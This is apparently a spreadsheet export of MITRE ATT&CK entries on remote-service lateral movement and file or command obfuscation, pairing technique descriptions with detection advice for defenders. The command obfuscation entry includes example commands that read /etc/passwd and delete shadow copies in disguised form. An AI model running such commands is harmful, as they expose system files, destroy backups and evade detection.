Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)</t>
  </si>
  <si>
    <t>Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. 
Use of applications such as ARD may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using these applications. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. 
In macOS, you can review logs for "screensharingd" and "Authentication" event messages. Monitor network connections regarding remote management (ports tcp:3283 and tcp:5900) and for remote login (port tcp:22).(Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</t>
  </si>
  <si>
    <t>T1021.001</t>
  </si>
  <si>
    <t>Remote Desktop Protocol (T1021.001)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.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connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)</t>
  </si>
  <si>
    <t>Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.</t>
  </si>
  <si>
    <t>T1021.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Logon Session: Logon Session Creation, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.
SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.
Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)</t>
  </si>
  <si>
    <t>Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)</t>
  </si>
  <si>
    <t>T1021.003</t>
  </si>
  <si>
    <t>Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.
The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)
Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)
Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)</t>
  </si>
  <si>
    <t>Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.
Monitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).</t>
  </si>
  <si>
    <t>T1021.004</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Linux, macOS</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.
SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.</t>
  </si>
  <si>
    <t>Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.
On macOS systems &lt;code&gt;log show --predicate 'process = "sshd"'&lt;/code&gt; can be used to review incoming SSH connection attempts for suspicious activity. The command &lt;code&gt;log show --info --predicate 'process = "ssh" or eventMessage contains "ssh"'&lt;/code&gt; can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)
On Linux systems SSH activity can be found in the logs located in &lt;code&gt;/var/log/auth.log&lt;/code&gt; or &lt;code&gt;/var/log/secure&lt;/code&gt; depending on the distro you are using.</t>
  </si>
  <si>
    <t>T1021.005</t>
  </si>
  <si>
    <t>VNC (T1021.005)</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)
VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)
Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)</t>
  </si>
  <si>
    <t>Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.
On macOS systems &lt;code&gt;log show --predicate 'process = "screensharingd" and eventMessage contains "Authentication:"'&lt;/code&gt; can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)
Monitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)</t>
  </si>
  <si>
    <t>T1021.006</t>
  </si>
  <si>
    <t>Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation, Service: Service Metadata</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.
WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)</t>
  </si>
  <si>
    <t>Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement) Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).</t>
  </si>
  <si>
    <t>T1021.007</t>
  </si>
  <si>
    <t>Cloud Services (T1021.007)</t>
  </si>
  <si>
    <t>Logon Session: Logon Session Creation</t>
  </si>
  <si>
    <t>IaaS, Identity Provider, Office Suite, SaaS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user.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Microsoft Graph PowerShell, and &lt;code&gt;gcloud auth login&lt;/code&gt; for the Google Cloud CLI.
In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. </t>
  </si>
  <si>
    <t>T1021.008</t>
  </si>
  <si>
    <t>IaaS</t>
  </si>
  <si>
    <t>Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).
Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. 
Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).</t>
  </si>
  <si>
    <t>T1025</t>
  </si>
  <si>
    <t>Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 
Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).</t>
  </si>
  <si>
    <t>T1027</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Metadata, Module: Module Load, Process: OS API Execution, Process: Process Creation, Script: Script Execution, WMI: WMI Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t xml:space="preserve">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mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. 
Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)
Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) </t>
  </si>
  <si>
    <t xml:space="preserve">Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). 
Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) 
Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. 
The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. </t>
  </si>
  <si>
    <t>T1027.001</t>
  </si>
  <si>
    <t>Binary Padding (T1027.001)</t>
  </si>
  <si>
    <t>File: File Metadata</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. 
Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) </t>
  </si>
  <si>
    <t xml:space="preserve">Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. </t>
  </si>
  <si>
    <t>T1027.002</t>
  </si>
  <si>
    <t>Software Packing (T1027.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) 
Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  </t>
  </si>
  <si>
    <t>Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.</t>
  </si>
  <si>
    <t>T1027.003</t>
  </si>
  <si>
    <t>Steganography (T1027.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.
[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) 
By the end of 2017, a threat group used &lt;code&gt;Invoke-PSImage&lt;/code&gt; to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  </t>
  </si>
  <si>
    <t>Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.</t>
  </si>
  <si>
    <t>T1027.004</t>
  </si>
  <si>
    <t>Compile After Delivery (T1027.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Metadata, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)
Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)</t>
  </si>
  <si>
    <t>Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.</t>
  </si>
  <si>
    <t>T1027.005</t>
  </si>
  <si>
    <t>Indicator Removal from Tools (T1027.005)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content</t>
  </si>
  <si>
    <t>Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.
A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.</t>
  </si>
  <si>
    <t>The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.</t>
  </si>
  <si>
    <t>T1027.006</t>
  </si>
  <si>
    <t>HTML Smuggling (T1027.006)</t>
  </si>
  <si>
    <t>File: File Creation</t>
  </si>
  <si>
    <t>Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)
Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as &lt;code&gt;text/plain&lt;/code&gt; and/or &lt;code&gt;text/html&lt;/code&gt;. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.
For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as &lt;code&gt;msSaveBlob&lt;/code&gt;.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)</t>
  </si>
  <si>
    <t>Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging.(Citation: Outlflank HTML Smuggling 2018) Detecting specific JavaScript and/or HTML5 attribute strings such as &lt;code&gt;Blob&lt;/code&gt;, &lt;code&gt;msSaveOrOpenBlob&lt;/code&gt;, and/or &lt;code&gt;download&lt;/code&gt; may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.
Consider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.</t>
  </si>
  <si>
    <t>T1027.007</t>
  </si>
  <si>
    <t>Dynamic API Resolution (T1027.007)</t>
  </si>
  <si>
    <t>File: File Metadata, Module: Module Load, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.
API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)
To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.
Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)</t>
  </si>
  <si>
    <t>T1027.008</t>
  </si>
  <si>
    <t>Stripped Payloads (T1027.008)</t>
  </si>
  <si>
    <t>Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)
Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)</t>
  </si>
  <si>
    <t>T1027.009</t>
  </si>
  <si>
    <t>Embedded Payloads (T1027.009)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Metadata</t>
  </si>
  <si>
    <t>Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) 
Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) 
For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) 
Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)</t>
  </si>
  <si>
    <t>T1027.010</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)
For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev &lt;&lt;&lt;'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&amp;$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)
Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)
Tools such as &lt;code&gt;Invoke-Obfuscation&lt;/code&gt; and &lt;code&gt;Invoke-DOSfucation&lt;/code&gt; have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)</t>
  </si>
  <si>
    <t>T1027.011</t>
  </si>
  <si>
    <t>Fileless Storage (T1027.011)</t>
  </si>
  <si>
    <t>Process: Process Creation, WMI: WMI Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may store data in "fileless" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)
